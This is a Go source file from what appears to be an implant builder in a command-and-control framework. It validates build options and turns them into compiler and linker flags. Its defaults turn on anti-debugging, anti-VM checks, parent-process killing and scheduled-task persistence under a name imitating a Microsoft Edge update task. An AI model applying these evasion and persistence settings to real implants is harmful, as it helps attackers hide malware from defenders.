package builder

import (
	"fmt"
	"regexp"
	"strings"
)

// ImplantType specifies which implant to build.
type ImplantType string

const (
	ImplantTypeCpp ImplantType = "cpp"
	ImplantTypeGo  ImplantType = "go"
)

// TargetOS specifies the target operating system.
type TargetOS string

const (
	TargetWindows TargetOS = "windows"
	TargetLinux   TargetOS = "linux"
	TargetDarwin  TargetOS = "darwin"
)

// TargetArch specifies the target architecture.
type TargetArch string

const (
	ArchAMD64 TargetArch = "amd64"
	Arch386   TargetArch = "386"
	ArchARM64 TargetArch = "arm64"
	ArchARM   TargetArch = "arm"
)

// DefaultBuildOptions contains the default values for implant build options.
var DefaultBuildOptions = BuildOptions{
	ImplantType:          ImplantTypeGo,
	TargetOS:             TargetWindows,
	TargetArch:           ArchAMD64,
	InitialSleepSeconds:  180,
	SchtaskPersist:       true,
	UseAntidebug:         true,
	KillParent:           true,
	UseAntiVM:            true,
	ScheduledTaskName:    "MicrosoftEdgeUpdateTaskMachineUA",
	RegisterMaxRetries:   5,
	Debug:                false,
}

// BuildOptions contains all configurable options for building an implant.
type BuildOptions struct {
	// ImplantType specifies which implant codebase to build (cpp or go).
	ImplantType ImplantType `json:"implant_type"`

	// Target platform settings (primarily for Go implant).
	TargetOS   TargetOS   `json:"target_os"`
	TargetArch TargetArch `json:"target_arch"`

	// C++ implant specific options.
	InitialSleepSeconds int    `json:"initial_sleep_seconds"`
	SchtaskPersist      bool   `json:"schtask_persist"`
	UseAntidebug        bool   `json:"use_antidebug"`
	KillParent          bool   `json:"kill_parent"`
	UseAntiVM           bool   `json:"use_antivm"`
	ScheduledTaskName   string `json:"scheduled_task_name"`
	RegisterMaxRetries  int    `json:"register_max_retries"`

	// Debug mode (includes debug symbols, logging).
	Debug bool `json:"debug"`
}

// Validate checks that the build options are valid.
func (o *BuildOptions) Validate() error {
	// Validate implant type
	switch o.ImplantType {
	case ImplantTypeCpp, ImplantTypeGo:
		// Valid
	case "":
		o.ImplantType = DefaultBuildOptions.ImplantType
	default:
		return fmt.Errorf("invalid implant_type: %s (must be 'cpp' or 'go')", o.ImplantType)
	}

	// C++ implant only supports Windows
	if o.ImplantType == ImplantTypeCpp && o.TargetOS != TargetWindows && o.TargetOS != "" {
		return fmt.Errorf("cpp implant only supports windows target")
	}

	// Validate target OS
	switch o.TargetOS {
	case TargetWindows, TargetLinux, TargetDarwin:
		// Valid
	case "":
		o.TargetOS = DefaultBuildOptions.TargetOS
	default:
		return fmt.Errorf("invalid target_os: %s", o.TargetOS)
	}

	// Validate target arch
	switch o.TargetArch {
	case ArchAMD64, Arch386, ArchARM64, ArchARM:
		// Valid
	case "":
		o.TargetArch = DefaultBuildOptions.TargetArch
	default:
		return fmt.Errorf("invalid target_arch: %s", o.TargetArch)
	}

	// Apply defaults for zero values
	if o.InitialSleepSeconds <= 0 {
		o.InitialSleepSeconds = DefaultBuildOptions.InitialSleepSeconds
	}
	if o.RegisterMaxRetries <= 0 {
		o.RegisterMaxRetries = DefaultBuildOptions.RegisterMaxRetries
	}
	if o.ScheduledTaskName == "" {
		o.ScheduledTaskName = DefaultBuildOptions.ScheduledTaskName
	}

	// Sanitize scheduled task name
	o.ScheduledTaskName = cleanupString(o.ScheduledTaskName)
	if o.ScheduledTaskName == "" {
		return fmt.Errorf("scheduled_task_name cannot be empty after sanitization")
	}

	return nil
}

// ToCppCompilerFlags generates compiler flags for the C++ implant.
func (o *BuildOptions) ToCppCompilerFlags() []string {
	flags := make([]string, 0, 8)

	flags = append(flags, fmt.Sprintf("-DINITIAL_SLEEP_SECONDS=%d", o.InitialSleepSeconds))
	flags = append(flags, fmt.Sprintf("-DSCHTASK_PERSIST=%s", boolToUpperString(o.SchtaskPersist)))
	flags = append(flags, fmt.Sprintf("-DUSE_ANTIDEBUG=%s", boolToUpperString(o.UseAntidebug)))
	flags = append(flags, fmt.Sprintf("-DKILL_PARENT=%s", boolToUpperString(o.KillParent)))
	flags = append(flags, fmt.Sprintf("-DUSE_ANTIVM=%s", boolToUpperString(o.UseAntiVM)))
	flags = append(flags, fmt.Sprintf("-DSCHEDULED_TASK_NAME='OBFUSCATED(\\\"%s\\\")'", o.ScheduledTaskName))
	flags = append(flags, fmt.Sprintf("-DREGISTER_MAX_RETRIES=%d", o.RegisterMaxRetries))

	return flags
}

// ToGoLDFlags generates ldflags for the Go implant.
func (o *BuildOptions) ToGoLDFlags() string {
	if o.Debug {
		return "-X maliketh.config.DEBUG=true -X maliketh.config.INITIAL_SLEEP=1"
	}
	return "-s -w -X maliketh.config.DEBUG=false"
}

// cleanupString removes non-alphanumeric characters from a string.
func cleanupString(s string) string {
	reg := regexp.MustCompile(`[^a-zA-Z0-9]`)
	return reg.ReplaceAllString(s, "")
}

func boolToUpperString(b bool) string {
	if b {
		return "TRUE"
	}
	return "FALSE"
}

// FromMap creates BuildOptions from a map (e.g., from JSON).
func FromMap(m map[string]any) (*BuildOptions, error) {
	opts := DefaultBuildOptions

	if v, ok := m["implant_type"].(string); ok {
		opts.ImplantType = ImplantType(strings.ToLower(v))
	}
	if v, ok := m["target_os"].(string); ok {
		opts.TargetOS = TargetOS(strings.ToLower(v))
	}
	if v, ok := m["target_arch"].(string); ok {
		opts.TargetArch = TargetArch(strings.ToLower(v))
	}
	if v, ok := m["initial_sleep_seconds"].(float64); ok {
		opts.InitialSleepSeconds = int(v)
	}
	if v, ok := m["schtask_persist"].(bool); ok {
		opts.SchtaskPersist = v
	}
	if v, ok := m["use_antidebug"].(bool); ok {
		opts.UseAntidebug = v
	}
	if v, ok := m["kill_parent"].(bool); ok {
		opts.KillParent = v
	}
	if v, ok := m["use_antivm"].(bool); ok {
		opts.UseAntiVM = v
	}
	if v, ok := m["scheduled_task_name"].(string); ok {
		opts.ScheduledTaskName = v
	}
	if v, ok := m["register_max_retries"].(float64); ok {
		opts.RegisterMaxRetries = int(v)
	}
	if v, ok := m["debug"].(bool); ok {
		opts.Debug = v
	}

	if err := opts.Validate(); err != nil {
		return nil, err
	}

	return &opts, nil
}
